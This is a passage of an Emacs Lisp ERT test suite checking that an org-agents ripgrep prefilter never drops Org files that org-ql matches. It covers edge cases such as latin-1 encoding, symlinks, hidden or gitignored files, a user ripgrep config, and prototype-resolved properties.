inheritance is off and the element cache is nil, as in
`org-agents-test--with-corpus'; the ID location table is a fresh one, so
nothing writes a temporary corpus into the developer's
`org-id-locations-file'; and `org-agents-prefilter' is `auto', so a
developer's own customization cannot decide what these tests exercise.

`skip-unless' guards on the executable: a ripgrep backend cannot be
tested end to end without ripgrep.  The pattern and exit-status tests
above do NOT go through this macro and never skip.

Use `org-agents-test--with-rg-corpus-unguarded' instead for a test that
needs the CORPUS but not the executable -- the fallback tests, which
point `org-agents-rg-executable' at a name that does not exist, at a
fake shell script, or turn the prefilter off entirely.  Guarding those
on ripgrep hid, on exactly the machine that has none, the tests that
describe what that machine will do at runtime."
  (declare (indent 0))
  `(progn
     (skip-unless (executable-find org-agents-rg-executable))
     (org-agents-test--with-rg-corpus-unguarded ,@body)))

(defmacro org-agents-test--with-rg-corpus-unguarded (&rest body)
  "`org-agents-test--with-rg-corpus' without the ripgrep `skip-unless'.
For a test that needs the fixture corpus but supplies its own ripgrep,
or none: a nonexistent executable name, a fake shell script, or
`org-agents-prefilter' nil.  Call the guarded macro for anything that
runs the real thing."
  (declare (indent 0))
  `(let ((org-agents-prefilter 'auto)
         ;; NO TIMEOUT for the soundness fixtures.  These tests assert what
         ;; ripgrep FOUND -- which patterns cover which files -- and a
         ;; spurious expiry turns that into `unavailable' and a coverage
         ;; test into a lie about coverage.  OBSERVED: at load average 25 a
         ;; run over a 34-file temp corpus hit the 30-second default and
         ;; `org-agents-test-rg-covers-an-accumulated-property-name' failed
         ;; on `(listp unavailable)' after 30.997 s.  The bound itself has
         ;; its own tests -- `org-agents-test-rg-run-times-out-and-does-not-hang'
         ;; and `...-honours-no-timeout' -- so nothing is lost by taking it
         ;; off here, and a run over three dozen files in a temp directory
         ;; is not the case a bound exists for.
         (org-agents-rg-timeout nil))
     (let* ((dir (make-temp-file "org-agents-rg-corpus" t))
            (outside (make-temp-file "org-agents-rg-outside" t))
            ;; A registry OUTSIDE the corpus, and one that does not exist
            ;; until a test writes it: the corpus is enumerated by
            ;; `directory-files-recursively', so a registry inside it
            ;; would be a thirty-fifth `.org' file.  A test that needs
            ;; declarations writes them to `registry'; every other test
            ;; gets "nothing declared", which is what the widened
            ;; alternation is sound under.
            (registry (expand-file-name "attributes.org" outside))
            (org-agents-attributes-file registry)
            (org-agents--attributes-cache nil)
            (org-agents--prototypes-cache nil)
            (org-agents--prototype-id-cache nil)
            (org-agents--prototype-warned nil)
            (org-directory dir)
            (org-agenda-files nil)
            (org-use-property-inheritance nil)
            (org-element-use-cache nil)
            (org-id-track-globally nil)
            (org-id-locations (make-hash-table :test #'equal))
            (org-id-files nil)
            (org-id-locations-file (expand-file-name ".org-id-locations" dir))
            (F (lambda (name) (expand-file-name name dir)))
            paths)
       (unwind-protect
           (progn
             (dolist (entry org-agents-test--rg-corpus)
               (let ((file (expand-file-name (car entry) dir)))
                 (make-directory (file-name-directory file) t)
                 (let ((coding-system-for-write 'binary))
                   (write-region (encode-coding-string (cdr entry) 'utf-8)
                                 nil file nil 'quiet))))
             ;; Three fixture parts that cannot be written as manifest text.
             ;;
             ;; A bare `.git', so rg applies the `.gitignore' above.
             (make-directory (expand-file-name ".git" dir) t)
             ;; A latin-1 heading with an ASCII literal AFTER the invalid
             ;; UTF-8 byte, and an ASCII property name.
             (let ((coding-system-for-write 'latin-1-unix))
               (with-temp-file (expand-file-name "latin1.org" dir)
                 (insert "* TODO Caf\351 Review of the widget\n"
                         ":PROPERTIES:\n:NEXT_REVIEW: [2024-01-15 Mon]\n"
                         ":END:\n")))
             ;; A symlink whose target lives OUTSIDE the corpus, so the
             ;; truename intersection cannot rescue it.  MEASURED:
             ;; `directory-files-recursively' lists the link and org-ql
             ;; matches through it, while rg does not follow a symlink
             ;; found by traversal without `--follow'.
             (let ((target (expand-file-name "real.org" outside)))
               (with-temp-file target
                 (insert "* TODO Symlinked review\n:PROPERTIES:\n"
                         ":NEXT_REVIEW: [2024-11-11 Mon]\n:END:\n"))
               (make-symbolic-link target (expand-file-name "link.org" dir)))
             (setq paths (directory-files-recursively dir "\\.org\\'"))
             ;; The fixture is not silently inert.  Every `.org' file the
             ;; manifest names, and the latin-1 one built just above, has
             ;; to be in the base file set by name and not merely by
             ;; count.
             (dolist (name (cons "latin1.org"
                                 (mapcar #'car org-agents-test--rg-corpus)))
               (when (string-match-p "\\.org\\'" name) ; folds, so UPPER.ORG counts
                 (should (member (expand-file-name name dir) paths))))
             ;; `link.org' is the one fixture file NOT asserted here.
             ;; MEASURED on this platform: `file-name-all-completions'
             ;; intermittently reports a symlink-to-a-file with a
             ;; trailing slash, which makes
             ;; `directory-files-recursively' take it for a directory it
             ;; must not follow and drop it -- so whether org-ql is even
             ;; handed it is not this package's to decide.  What IS this
             ;; package's is that ripgrep answers with it whenever org-ql
             ;; could match in it, and that is asserted against the
             ;; CANDIDATE set, where there is no such flakiness, by
             ;; `org-agents-test-rg-covers-the-files-it-skips-by-default'.
             (should (<= org-agents-test--rg-corpus-count
                         (length paths)
                         (1+ org-agents-test--rg-corpus-count)))
             (ignore F registry)
             ,@body)
         (dolist (buf (buffer-list))
           (when-let* ((f (buffer-file-name buf)))
             (when (or (string-prefix-p (file-name-as-directory dir) f)
                       (string-prefix-p (file-name-as-directory outside) f))
               (with-current-buffer buf (set-buffer-modified-p nil))
               (kill-buffer buf))))
         (delete-directory dir t)
         (delete-directory outside t)))))

(defun org-agents-test--live-files (query paths)
  "Truenames of the files org-ql actually matches for QUERY over PATHS.
It names org-ql and nothing else, which is what keeps the left-hand side
of every soundness assertion independent of the prefilter."
  (delete-dups
   (mapcar #'file-truename
           (delq nil (org-ql-select paths query
                       :action '(buffer-file-name))))))

(defun org-agents-test--should-cover (query paths root)
  "Assert the prefilter's candidates cover every file org-ql matches for QUERY.
Never `equal': the contract is a SUPERSET, and several fixtures depend on
the candidate set being legitimately wider.  Both sides are asserted
non-empty, so a fixture that quietly stopped matching cannot make the
relation hold for want of anything to relate.  Returns the candidate
truenames, so a caller can add its own narrowing assertion without
running ripgrep twice."
  (let* ((live (org-agents-test--live-files query paths))
         (conjuncts (org-agents--prefilter-conjuncts query))
         (answer (org-agents--rg-files conjuncts root)))
    (should live)
    (should conjuncts)
    (should (listp answer))
    (should answer)
    (let ((cands (mapcar #'file-truename answer)))
      (dolist (file live)
        (should (member file cands)))
      cands)))

(ert-deftest org-agents-test-rg-covers-property-existence ()
  "The baseline, with the residual `(todo)' left for org-ql."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover
                  '(and (todo) (property "NEXT_REVIEW")) paths dir)))
      ;; It narrows.
      (should-not (member (file-truename (funcall F "filler.org")) cands))
      (should-not (member (file-truename (funcall F "plan.org")) cands))
      (should-not (member (file-truename (funcall F "head-regexp.org")) cands))
      ;; And it is allowed to be wider: the residual `(todo)' rejects the
      ;; DONE entry on the Emacs side, and the file is a candidate anyway.
      (should (member (file-truename (funcall F "prop-done.org")) cands)))))

(ert-deftest org-agents-test-rg-covers-an-accumulated-property-name ()
  "`:TOKENS+:' with no plain `:TOKENS:' line: the `\\+?' regression.
This is the defect that the suite this replaces recorded as an EXPECTED
FAILURE, turning into an ordinary passing test.  It is one of the two
reasons the backend swap is a correctness improvement rather than only a
simplification; the other is that ripgrep reads the bytes on disk, so
there is no staleness window in which a file that newly matches is
missed."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(property "TOKENS")
                                                paths dir)))
      (should (equal cands
                     (list (file-truename (funcall F "prop-accum.org"))))))))

(ert-deftest org-agents-test-rg-covers-a-lower-case-property-name ()
  "`--ignore-case': the drawer spells `:next_review:', the query `\"P\"'."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(property "NEXT_REVIEW")
                                                paths dir)))
      (should (member (file-truename (funcall F "prop-case.org")) cands)))))

(ert-deftest org-agents-test-rg-covers-an-indented-property-line ()
  "`^[ \\t]*': the drawer is space-indented and its property line tabbed."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(property "NEXT_REVIEW")
                                                paths dir)))
      (should (member (file-truename (funcall F "prop-indent.org")) cands)))))

(ert-deftest org-agents-test-rg-covers-a-property-value ()
  "Equality pushes the value, and a value the corpus lacks answers EMPTY.
An empty answer is an answer: no error, no fallback, and an agent that
renders nothing."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(property "STYLE" "habit")
                                                paths dir)))
      (should (member (file-truename (funcall F "prop.org")) cands))
      (should (member (file-truename (funcall F "two-props.org")) cands))
      ;; The witness for the `[ \t]*' tail of the value pattern.
      ;; `prop-trailing.org' spells the line `:STYLE: habit ' with one
      ;; trailing space; `org-entry-get' trims and answers "habit", so
      ;; org-ql matches -- and a pattern ending `habit$' rather than
      ;; `habit[ \t]*$' does not match the line and loses the file.
      ;; Without this, tightening the tail failed only the pattern's
      ;; string-equality pin, whose message names no lost file.
      (should (member (file-truename (funcall F "prop-trailing.org")) cands))
      (should (= 3 (length cands))))
    ;; A CRLF file, which the value pattern reaches only with `--crlf'.
    (let ((cands (org-agents-test--should-cover '(property "OWNER" "Jane")
                                                paths dir)))
      (should (member (file-truename (funcall F "crlf.org")) cands)))
    ;; No file holds it: an empty list, and `listp' says it is an answer.
    (let ((answer (org-agents--rg-files '((property "STYLE" "nosuchvalue"))
                                        dir)))
      (should (listp answer))
      (should (null answer)))))

(ert-deftest org-agents-test-rg-covers-a-value-holding-regexp-syntax ()
  "The escaper, where it was measured to matter.
Unquoted, `a+b' matches nothing; quoted with Emacs `regexp-quote',
`alpha(beta)' matches nothing, because Emacs leaves `(' alone and rg
reads it as a group."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(property "CODE" "a+b")
                                                paths dir)))
      (should (equal cands
                     (list (file-truename (funcall F "value-regexp.org"))))))
    (let ((cands (org-agents-test--should-cover
                  '(property "PAREN" "alpha(beta)") paths dir)))
      (should (equal cands
                     (list (file-truename (funcall F "value-regexp.org"))))))))

(ert-deftest org-agents-test-rg-downgrades-a-value-it-cannot-see-on-one-line ()
  "`org-entry-get' joins `:P:' and `:P+:' with a separator, so an
assembled value is spelled on NO line of the file and a line-oriented
matcher cannot find it.  Equality therefore falls back to existence,
which is wider and so sound.

The separator rule generalizes the whitespace rule rather than replacing
it: with the default separator the two coincide, but MEASURED with
`org-property-separators' bound to `((\"P\") . \"/\")', `:P: al' plus
`:P+: pha' answers \"al/pha\" -- a value holding no whitespace that no
single line spells.  The whitespace test alone would push it."
  (let ((org-use-property-inheritance nil))
    ;; The default separator is a space, so a value with whitespace in it
    ;; may have come from two lines.
    (should (equal (org-agents--prefilter-conjuncts '(property "OWNER" "Jane Doe"))
                   '((property "OWNER"))))
    ;; The emitter is handed what the splitter decided, so the pattern
    ;; that reaches ripgrep names no value at all.
    (should (equal (org-agents--rg-patterns
                    (car (org-agents--prefilter-conjuncts
                          '(property "OWNER" "Jane Doe"))))
                   '("^[ \\t]*:OWNER\\+?:")))
    ;; A custom separator that is not whitespace: the whitespace test
    ;; passes and the value must still not be pushed.
    (let ((org-property-separators '((("P") . "/"))))
      (should (equal (org-agents--prefilter-conjuncts '(property "P" "al/pha"))
                     '((property "P"))))
      ;; A value that does not hold the separator came from one line.
      (should (equal (org-agents--prefilter-conjuncts '(property "P" "alpha"))
                     '((property "P" "alpha")))))
    ;; An empty separator makes the argument unavailable for any value.
    (let ((org-property-separators '((("P") . ""))))
      (should (equal (org-agents--prefilter-conjuncts '(property "P" "alpha"))
                     '((property "P")))))
    ;; An empty value is spelled `:P:' with nothing after the colon, which
    ;; the value pattern cannot match because it demands `[ \\t]+'.
    (should (equal (org-agents--prefilter-conjuncts '(property "P" ""))
                   '((property "P"))))))

(ert-deftest org-agents-test-rg-covers-the-planning-keywords ()
  "Stamp existence only, and each keyword its own pattern.
rg cannot compare dates, so every bound stays residual -- including the
repeater in the fixture, which org-ql may match on an occurrence the
written stamp does not name."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover
                  '(and (scheduled :on "2024-02-29") (todo)) paths dir)))
      (should (member (file-truename (funcall F "plan.org")) cands))
      (should-not (member (file-truename (funcall F "prop.org")) cands))
      (should-not (member (file-truename (funcall F "filler.org")) cands)))
    (dolist (query '((scheduled)
                     (scheduled :from "2024-01-01")
                     (deadline auto)
                     (deadline 7)
                     (scheduled :to today :to "2026-01-01")
                     (closed :on today :from -3)))
      (should (org-agents--prefilter-conjuncts query)))
    ;; A DEADLINE query must not be answered by a SCHEDULED pattern.
    (let ((cands (org-agents-test--should-cover
                  '(deadline :from "2024-01-01" :to "2024-12-31") paths dir)))
      (should (member (file-truename (funcall F "plan.org")) cands))
      (should-not (member (file-truename (funcall F "plan-indent.org")) cands)))
    (let ((cands (org-agents-test--should-cover '(closed :on "2024-03-01")
                                                paths dir)))
      (should (member (file-truename (funcall F "plan.org")) cands))
      (should-not (member (file-truename (funcall F "plan-indent.org"))
                          cands)))))

(ert-deftest org-agents-test-rg-covers-an-indented-planning-line ()
  "`org-adapt-indentation' indents a planning line by default."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(scheduled) paths dir)))
      (should (member (file-truename (funcall F "plan-indent.org")) cands)))))

(ert-deftest org-agents-test-rg-covers-a-shared-planning-line ()
  "All three keywords may share ONE line, in any order.
`^[ \\t]*DEADLINE:' would miss `CLOSED: [..] DEADLINE: <..>', which is
why the planning patterns are deliberately NOT anchored."
  (org-agents-test--with-rg-corpus
    (dolist (query '((deadline :to "2024-12-31") (closed) (scheduled)))
      (let ((cands (org-agents-test--should-cover query paths dir)))
        (should (member (file-truename (funcall F "plan-shared-line.org"))
                        cands))))))

(ert-deftest org-agents-test-rg-covers-a-heading-literal ()
  "The title org-ql compares against is spelled by the raw heading line.
`org-get-heading' with `no-tags' and `no-todo' returns the title, or the
priority cookie joined to it by exactly one space -- and every substring
spanning that junction holds the `]' that
`org-agents--heading-literals-p' refuses.  See
`org-agents-test-rg-refuses-a-heading-across-a-priority-cookie' for the
file that guard saves."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover
                  '(and (heading "Review widget") (todo)) paths dir)))
      (should (member (file-truename (funcall F "head.org")) cands)))
    ;; Two literals: org-ql wants both in ONE heading, which implies a
    ;; heading line for each, so intersecting the per-literal sets is
    ;; sound and narrows harder than testing only the first.
    (let ((cands (org-agents-test--should-cover '(heading "widget" "spec")
                                                paths dir)))
      (should (equal cands (list (file-truename (funcall F "head.org"))))))
    ;; `%' and `_' are not regexp syntax and must survive quoting intact.
    (let ((cands (org-agents-test--should-cover '(heading "50%_done")
                                                paths dir)))
      (should (member (file-truename (funcall F "head.org")) cands)))))

(ert-deftest org-agents-test-rg-covers-a-heading-differing-in-case ()
  "org-ql's `heading' binds `case-fold-search' t inside its own body, so
there is no configuration under which it is case-sensitive."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(heading "Review") paths dir)))
      (should (member (file-truename (funcall F "head-case.org")) cands)))))

(ert-deftest org-agents-test-rg-covers-a-heading-holding-regexp-syntax ()
  "Regexp syntax in a heading literal is pushed, and narrows correctly.
org-ql `regexp-quote's every `heading' argument and the emitter escapes
the Rust metacharacter set, so both sides seek the same TEXT.  The
splitter used to refuse `. + * ? ^ $ [ ] { } | \\' outright, which cost
narrowing on about one of the author's heading titles in four -- and the
`(' case below shows the emitter was already trusted with exactly this."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(heading "Review (draft)")
                                                paths dir)))
      (should (equal cands
                     (list (file-truename (funcall F "head-paren.org"))))))
    ;; `.' and `*', which used to push nothing at all.  Narrowed to the
    ;; one file, so the literal really was sought as text: a pattern
    ;; where `.' meant "any character" would also match `Review' lines.
    (let ((cands (org-agents-test--should-cover '(heading "Rev.*iew")
                                                paths dir)))
      (should (equal cands
                     (list (file-truename (funcall F "head-regexp.org"))))))
    ;; Braces, which are a repetition operator to ripgrep.
    (let ((cands (org-agents-test--should-cover '(heading "Ship it {maybe}")
                                                paths dir)))
      (should (equal cands
                     (list (file-truename (funcall F "head-regexp.org"))))))))

(ert-deftest org-agents-test-rg-refuses-a-heading-across-a-priority-cookie ()
  "The one heading literal that must NOT be pushed, and the file it loses.
`org-get-heading' reassembles the title from `org-complex-heading-regexp''s
groups joined by a single space rather than slicing the line, so for
`* [#A]   Collapsed review' it answers `[#A] Collapsed review' -- a
string the file does not spell.  org-ql matches the literal
`[#A] Collapsed'; ripgrep, searching the raw line, cannot.

So the splitter pushes nothing for it, and this test asserts all four
legs: the raw line does not spell the reassembled title, org-ql matches
the literal anyway, the splitter declines, and the pattern the emitter
WOULD produce finds no file.  Together they make the guard load-bearing
rather than decorative -- relax `org-agents--heading-literals-p' to
accept `]' and this becomes a silent lost match.

The org-ql leg needs a word, because it is where the trap is.  org-ql
gives `heading-regexp' a PREAMBLE -- `bol (1+ \"*\") (1+ blank) (0+ nonl)
REGEXP', an Emacs-side search of the raw LINE -- and where the query
planner uses it, org-ql agrees with the raw line and misses this entry
too.  So a bare `(heading \"[#A] Collapsed\")' answers nothing and would
make this test pass for entirely the wrong reason.  Whether the preamble
is used is a property of the whole query: `(and (level 1) (heading ...))'
does not get one, the body runs alone, and org-ql matches the
reassembled title.  MEASURED, all four shapes: `(heading L)' and
`(and (heading L) (todo))' answer 0, while `(and (level 1) (heading L))'
and `(or (heading L) (heading \"zzz-nope\"))' answer 1.  A prefilter may
not depend on a query-planner optimization, so the guard has to hold for
the shape where the preamble is absent."
  (org-agents-test--with-rg-corpus
    (let* ((literal "[#A] Collapsed")
           (file (funcall F "head-collapse.org")))
      ;; The mechanism itself: `org-get-heading' reassembles rather than
      ;; slices, so the title it answers is not in the file.
      (with-current-buffer (find-file-noselect file)
        (goto-char (point-min))
        (let ((heading (org-get-heading t t)))
          (should (equal heading "[#A] Collapsed review"))
          (should (string-search literal heading))
          (should-not (string-search heading (buffer-string)))))
      ;; org-ql matches it, in the query shape that gets no preamble.
      (should (equal (org-agents-test--live-files
                      (list 'and '(level 1) (list 'heading literal)) paths)
                     (list (file-truename file))))
      ;; The splitter declines, so the scope is scanned live and correct.
      (should (null (org-agents--prefilter-conjuncts (list 'heading literal))))
      ;; And had it been pushed, the file would have been lost: the
      ;; pattern is well formed, ripgrep runs it, and it answers empty.
      (let* ((patterns (org-agents--rg-patterns (list 'heading literal)))
             (answer (org-agents--rg-run (car patterns) dir)))
        (should (= 1 (length patterns)))
        (should (listp answer))
        (should (null answer))))))

(ert-deftest org-agents-test-rg-covers-a-heading-in-a-non-utf-8-file ()
  "The test nobody would think to write, and it fails on a real corpus.
The witness is latin-1 encoded and the ASCII literal sits AFTER an
invalid UTF-8 byte on the same line.  MEASURED: rg's default Unicode
mode makes `.' match a codepoint, so `^\\*+.*Review' cannot cross the
byte and misses the file.  `(?-u:.)*' is the fix that was measured to
work; `[^\\n]*' is not."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(heading "Review") paths dir)))
      (should (member (file-truename (funcall F "latin1.org")) cands)))))

(ert-deftest org-agents-test-rg-covers-the-files-it-skips-by-default ()
  "One test for the traversal hazards, because they share one cause --
rg's default filters -- and one fix, the argument vector.  Each is a file
`directory-files-recursively' lists and org-ql matches.

The last two are the ones that make `--hidden' and `--no-ignore'
DISCRIMINATE, and they are directories rather than files on purpose.
MEASURED: with an inclusive `--iglob \\='*.org\\='' in the vector,
ripgrep still reports `.stealth.org', `ignored.org' and
`gitignored.org' with both flags removed -- the glob outranks its ignore
and hidden rules for a file it is handed.  A file under a hidden or
ignored DIRECTORY is different: the directory is never descended into,
so the glob never gets to speak, and the file is lost from the candidate
set with no error.  Before `.hidden/inhidden.org' and
`gitignored-dir/inside.org' existed, deleting `--hidden' and
`--no-ignore' broke the superset invariant while every soundness test
here stayed green."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(property "NEXT_REVIEW")
                                                paths dir)))
      (dolist (name '(".stealth.org" "ignored.org" "gitignored.org"
                      "UPPER.ORG" "link.org" "nul.org"
                      ".hidden/inhidden.org" "gitignored-dir/inside.org"))
        (should (member (file-truename (funcall F name)) cands))))))

(ert-deftest org-agents-test-rg-covers-a-subdirectory-under-a-user-rg-config ()
  "A user's own ripgrep config must not narrow the candidate set.
The outcome half of `org-agents-test-rg-run-unsets-the-ripgrep-config-variable',
and the one that names the lost file.  RIPGREP_CONFIG_PATH is pointed at
a config holding the single line `--max-depth=1', which is the shape of
a personal default a ripgrep user is likely to have.  MEASURED against
the shipped vector with the variable inherited: `sub/scoped.org' and
`sub{1}/braced.org' vanish from the candidate set while org-ql goes on
matching in them, and nothing is signalled -- `org-agents--rg-run' sees
exit 0 and a short answer, so it reports a successful prefilter.

`--max-filesize=10' is the sharper version of the same config: rg then
reports nothing at all and exits 1, which is a legitimate empty ANSWER,
so every agent renders zero matches with no message whatsoever.  This
test uses `--max-depth' because a lost file is a better failure message
than an empty everything."
  (org-agents-test--with-rg-corpus
    (let ((rc (expand-file-name "ripgreprc" outside)))
      (with-temp-file rc (insert "--max-depth=1\n"))
      (let ((process-environment
             (cons (concat "RIPGREP_CONFIG_PATH=" rc) process-environment)))
        (should (getenv "RIPGREP_CONFIG_PATH"))
        (let ((cands (org-agents-test--should-cover '(property "NEXT_REVIEW")
                                                    paths dir)))
          (should (member (file-truename (funcall F "sub/scoped.org")) cands))
          (should (member (file-truename (funcall F "sub{1}/braced.org"))
                          cands)))))))

(ert-deftest org-agents-test-rg-over-matches-body-prose-harmlessly ()
  "An over-match is a cost, never a fault.
`prose.org' holds the text `:NEXT_REVIEW: [..]' in a paragraph, in no
drawer, so `org-entry-get' never sees it and org-ql does not match the
file.  rg does.  The candidate set may hold it; the rendered result may
not, because org-ql alone decides what matches."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover '(property "NEXT_REVIEW")
                                                paths dir))
          (live (org-agents-test--live-files '(property "NEXT_REVIEW") paths)))
      (should (member (file-truename (funcall F "prose.org")) cands))
      (should-not (member (file-truename (funcall F "prose.org")) live)))))

(ert-deftest org-agents-test-rg-file-level-property-canary ()
  "A tripwire, and labelled as one: no mutation makes it fail today.
`(property \"FILEPROP\")' is pushed, org-ql matches nothing for it -- the
value is reachable only through `#+PROPERTY:' and inheritance -- and the
candidate set is empty.  It fails the day org-ql starts answering
`(property N)' out of file-level properties or `org-global-properties',
because then the live set becomes non-empty while the candidates stay
empty."
  (org-agents-test--with-rg-corpus
    ;; The fixture is not silently inert.
    (with-current-buffer (find-file-noselect (funcall F "fileprop.org"))
      (goto-char (point-min))
      (re-search-forward "^\\* ")
      (should (equal "fromfile" (org-entry-get nil "FILEPROP" t)))
      (should (null (org-entry-get nil "FILEPROP"))))
    (should (org-agents--prefilter-conjuncts '(property "FILEPROP")))
    (should (null (org-agents-test--live-files '(property "FILEPROP") paths)))
    (should (null (org-agents--rg-files
                   (org-agents--prefilter-conjuncts '(property "FILEPROP"))
                   dir)))))

(ert-deftest org-agents-test-same-files-compares-by-truename ()
  "The intersection is by TRUENAME, and the fast path may not change that.
`org-agents--same-files' admits a base file whose own spelling is
already a candidate spelling without calling `file-truename' on it,
because 0.525 s of readlink over 3,669 files is more than twice the cost
of the ripgrep runs the pass protects.  The saving is only sound while
the truename comparison remains the authority for everything else, so
both halves are pinned here.

The `~'-spelled case is the one that matters:
`directory-files-recursively' does not expand `~', so BASE can be
spelled `~/dir/a.org' where ripgrep prints the absolute path -- under
`equal' the two sides would have nothing in common and every agent would
match nothing."
  (let* ((dir (make-temp-file "org-agents-same" t))
         (a (expand-file-name "a.org" dir))
         (b (expand-file-name "b.org" dir))
         (link (expand-file-name "link" dir)))
    (unwind-protect
        (progn
          (with-temp-file a (insert "* A\n"))
          (with-temp-file b (insert "* B\n"))
          ;; Identical spellings: the fast path, and the answer is BASE's
          ;; own spellings in BASE's own order.
          (should (equal (org-agents--same-files (list a b) (list b a))
                         (list a b)))
          (should (equal (org-agents--same-files (list a b) (list a))
                         (list a)))
          (should (null (org-agents--same-files (list a b) nil)))
          ;; Different spellings of the same file: only the truename
          ;; comparison relates them, and it must still happen.
          (make-symbolic-link dir link)
          (let ((via-link (expand-file-name "a.org" link)))
            (should-not (equal via-link a))
            (should (equal (org-agents--same-files (list a) (list via-link))
                           (list a)))
            (should (equal (org-agents--same-files (list via-link) (list a))
                           (list via-link))))
          ;; A file the candidates do not name at all is dropped however
          ;; it is spelled, so the fast path cannot admit anything extra.
          (should (null (org-agents--same-files
                         (list b) (list (expand-file-name "c.org" dir))))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-rg-intersects-two-conjuncts ()
  "The candidate set is the INTERSECTION, not the union and not one pattern.
Concatenating the conjuncts into one pattern is what an implementer
trying to avoid a second rg run would write, and it is the mutation that
violates soundness: MEASURED live=2, cand=0, both witnesses lost."
  (org-agents-test--with-rg-corpus
    (let ((cands (org-agents-test--should-cover
                  '(and (property "NEXT_REVIEW") (property "STYLE"))
                  paths dir)))
      (should (member (file-truename (funcall F "prop.org")) cands))
      (should (member (file-truename (funcall F "two-props.org")) cands))
      ;; `prop-case.org' satisfies the first conjunct only.
      (should-not (member (file-truename (funcall F "prop-case.org"))
                          cands)))))

(ert-deftest org-agents-test-rg-residual-conjuncts-push-nothing ()
  "Nothing outside the vocabulary is pushed, and each query still finds
its witness through org-ql -- so the guard costs breadth, not answers."
  (org-agents-test--with-rg-corpus
    (dolist (query '((todo) (todo "TODO") (done) (tags "work")
                     (category "AnyCat") (ts :on "2024-02-29")
                     ;; `]' is the one character a heading literal may
                     ;; not hold; regexp syntax is pushed, and
                     ;; `org-agents-test-rg-refuses-a-heading-across-a-priority-cookie'
                     ;; is why this one is not.
                     (and (level 1) (heading "[#A] Collapsed"))
                     (property "CATEGORY" "work")
                     (property-ts "DEADLINE" :to today)
                     (parent (property "NEXT_REVIEW"))
                     (or (property "NEXT_REVIEW") (todo))
                     (not (property "NEXT_REVIEW"))))
      (should (null (org-agents--prefilter-conjuncts query))))
    ;; And the residual queries really do match, so the rows above are
    ;; refusing something that exists.
    (dolist (query '((todo) (ts :on "2024-02-29")
                     (and (level 1) (heading "[#A] Collapsed"))))
      (should (org-agents-test--live-files query paths)))))

(ert-deftest org-agents-test-rg-scope-files-narrows-a-directory-scope ()
  "A directory scope is searched by making the directory rg's ROOT.
MEASURED: `--glob 'sub{1}/**'' answers with NO files at all for a
directory that really holds a match, because `{' and `}' are glob
syntax.  A silently empty candidate set is the one failure this package
cannot afford, so the scope never becomes a glob -- and with the
directory as the root, the `(path \"dir/\")' conjunct the CLI needed has
no remaining purpose."
  (org-agents-test--with-rg-corpus
    (dolist (scope '("sub" "sub{1}"))
      (let* ((agent (list :scope scope :query '(property "NEXT_REVIEW")))
             (files (org-agents--scope-files agent))
             (base (org-agents--scope-base-files scope))
             (live (org-agents-test--live-files '(property "NEXT_REVIEW")
                                               base)))
        (should live)
        (should files)
        (dolist (file live)
          (should (member file (mapcar #'file-truename files))))
        (should-not (member (funcall F "prop.org") files))))))

(ert-deftest org-agents-test-rg-scope-files-refuses-a-missing-directory ()
  "A mistyped scope is named as one, before any subprocess runs.
rg's exit status for a missing path is the same 2 it uses for a broken
pattern, so reporting a mistyped scope as a prefilter failure would name
the wrong fault."
  (org-agents-test--with-rg-corpus
    (cl-letf (((symbol-function 'org-agents--rg-run)
               (lambda (&rest _) (error "must not run"))))
      (let ((err (should-error
                  (org-agents--scope-files
                   (list :scope "no-such-subdir"
                         :query '(property "NEXT_REVIEW")))
                  :type 'user-error)))
        (should (string-match-p "no-such-subdir"
                                (error-message-string err)))))))

;;; The widened conjunct, and the default exception

;; The prefilter's one UNSOUND-by-default case, and the suite that says
;; it is not.  An entry that resolves an attribute through a prototype
;; never spells the value, so the ordinary property pattern under-matches
;; -- a lost match with no error, which is the failure mode this package
;; must not have.  Every test below has a splitter half and an OUTCOME
;; half, because the splitter's answer is a string and the thing that
;; matters is a file.

(defconst org-agents-test--rg-registry-no-default "\
* STATUS
:PROPERTIES:
:ATTR_TYPE: string
:END:
Declared, and deliberately WITHOUT a default.

* Prototypes
** Task
:PROPERTIES:
:STATUS: active
:END:
"
  "A registry naming the master `proto-follower.org' follows, and no default.")

(defconst org-agents-test--rg-registry-default-active "\
* STATUS
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_DEFAULT: active
:END:
Declared WITH the very value the tests query for, which is the exception.

* Prototypes
** Task
:PROPERTIES:
:STATUS: active
:END:
"
  "The same registry, declaring `active' as the default: the exception.")

(defun org-agents-test--rg-truenames (conjuncts root)
  "The prefilter's answer for CONJUNCTS under ROOT, as truenames.
A list even where the answer is empty, so a caller may assert absence."
  (let ((answer (org-agents--rg-files conjuncts root)))
    (should (listp answer))
    (mapcar #'file-truename answer)))

(ert-deftest org-agents-test-rg-covers-a-value-that-arrives-through-a-prototype ()
  "The widening, end to end: the follower's file is a candidate.
`proto-follower.org' spells `:PROTOTYPE: Task' and holds no `:STATUS:'
text anywhere, so the ordinary `^[ \\t]*:STATUS\\+?:' pattern does not
return it and org-ql matches in it.  That is the lost match the
`:PROTOTYPE:' arm exists to prevent, and `org-agents-test--should-cover'
is what names the file if it goes missing.

Narrowed inside `org-agents--with-attributes', as `org-agents--collect'
narrows: `org-agents--resolved-default' refuses to answer outside a
registry batch, because a narrowing decided against one snapshot of
`:ATTR_DEFAULT:' and evaluated against another loses files silently."
  (org-agents-test--with-rg-corpus
    (with-temp-file registry
      (insert org-agents-test--rg-registry-no-default))
    (org-agents--with-attributes
      (let ((cands (org-agents-test--should-cover
                    '(and (todo) (property-resolved "STATUS" "active"))
                    paths dir)))
